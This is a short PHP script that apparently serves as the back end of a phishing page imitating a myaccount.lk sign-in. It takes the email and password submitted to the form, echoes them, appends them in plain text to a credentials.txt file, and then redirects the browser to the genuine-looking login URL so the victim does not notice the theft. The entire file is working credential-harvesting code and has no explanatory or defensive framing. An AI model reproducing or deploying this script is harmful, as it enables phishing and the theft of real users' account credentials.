<?php  	

  //Extract the credentials received 

  $username = $_POST["txtEmail"];  
  $password = $_POST["txtPassword"]; 
 
   echo "$username : " . $password;
   
   //Write the credentials to text file 
   
   $myfile = fopen("credentials.txt", "a") or die("Unable to open file!"); 
   $txt = "USERNAME = $username , PASSWORD = $password\n";     fwrite($myfile, "\n". $txt);     fclose($myfile); 
 
    //Redirect the browser to original login page  
	header("Location: https://myaccount.lk/signin?client_id=2000693325&redirect_uri=https%3A%2F%2Fmydeal.lk%2Fsignin%2Freturned&state=61580ddb7a4b9db5e6ee8fe1615a1b06&scope=email%2Ctelephone%2Cbilling_address&next=https%3A%2F%2Fconnect.myaccount.lk%2Fauth%2Fconfirm");  
	exit();
   
   
   
   
   
   
?> 